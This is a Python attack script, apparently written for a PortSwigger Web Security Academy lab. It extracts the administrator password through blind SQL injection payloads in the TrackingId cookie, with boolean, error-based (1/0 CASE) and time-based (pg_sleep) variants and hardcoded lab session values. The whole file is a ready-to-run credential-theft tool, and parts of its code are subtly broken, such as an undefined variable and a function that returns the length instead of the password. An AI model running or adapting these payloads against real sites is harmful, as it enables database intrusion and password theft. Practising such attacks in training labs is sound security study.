from pwn import *
import requests, signal, time, string, sys


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...]")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

main_url = "https://0afd0052033aec47807bb2130029009b.web-security-academy.net"
tracking_id = "prqAqXKwDvivj9FE"
session = "h0ht5ynf8kt9lwnq7h478xixks7e5buw"
characters = string.ascii_lowercase + string.digits


def get_password_length():
    estimade_max_length = 30
    password_length = None
    for i in range(30, 1, -1):

        cookie = {
            'TrackingId': f"{tracking_id}' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND length(password)<{i}) ='a",
            'session': f'{session}'
        }
        r = requests.get(main_url, cookies=cookie)
        if "Welcome back!" in r.text:
            estimade_max_length -= 1
        else:
            password_length = i
            print(length)

            break
    return password_length


def make_request():
    word = ""
    password_length = get_password_length()
    for id in range(1,password_length + 1):
        for char in characters:
            cookie = {
                'TrackingId': f"{tracking_id}' AND (SELECT SUBSTRING(password,{id},1)FROM users WHERE username = 'administrator')='{char}",
                'session': f'{session}'
            }
            r = requests.get(main_url, cookies=cookie)
            if "Welcome back!" in r.text:
                word += char
                print(word)
                break
    print(word)






def blind_get_password_length():
    estimade_max_length = 30
    password_length = None

    for i in range(30, 1, -1):

        cookie = {
            'TrackingId': f"{tracking_id}'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END FROM users where username='administrator' AND length(password)<{i})||'",
            'session': f'{session}'
        }
        r = requests.get(main_url, cookies=cookie)
        if r.status_code == 500: #es menor
            estimade_max_length -= 1
        else:
            password_length = i
            print(password_length)
            break
    return password_length


def make_blind_request():
    word = ""
    password_length = blind_get_password_length()
    for id in range(1,password_length + 1):
        for char in characters:
            print(char)
            cookie = {
                'TrackingId': f"{tracking_id}'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END FROM users where username='administrator' AND SUBSTR(password,{id},1)='{char}')||'",
                'session': f'{session}'
            }
            r = requests.get(main_url, cookies=cookie)
            if r.status_code == 500:  # verdadero
                word += char
                print(word)
                break
    return password_length

def time_based_blind_get_password_length():
    estimade_max_length = 30
    password_length = None

    for i in range(30, 1, -1):

        cookie = {
            'TrackingId': f"{tracking_id}'||(SELECT CASE WHEN (length(password)<{i}) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users where username='administrator')--+",
            'session': f'{session}'
        }
        r = requests.get(main_url, cookies=cookie, timeout=1.1)
        if r.elapsed.total_seconds() > 1: #es menor
            estimade_max_length -= 1
        else:
            password_length = i
            print(password_length)
            break
    return password_length


def make_time_based_blind_request():
    word = ""
    password_length = time_based_blind_get_password_length()
    for id in range(1,password_length + 1):
        for char in characters:
            print(char)
            cookie = {
                'TrackingId': f"{tracking_id}'||(select case when substring(password,{id},1)='{char}' then pg_sleep(0) else pg_sleep(0.5)end from users where username='administrator')--+",
                'session': f'{session}'
            }
            r = requests.get(main_url, cookies=cookie,timeout=3)
            if r.elapsed.total_seconds()<0.5:  # verdadero
                word += char
                print(">>"+word)
                break
    return password_length



if __name__ == "__main__":
    make_time_based_blind_request()
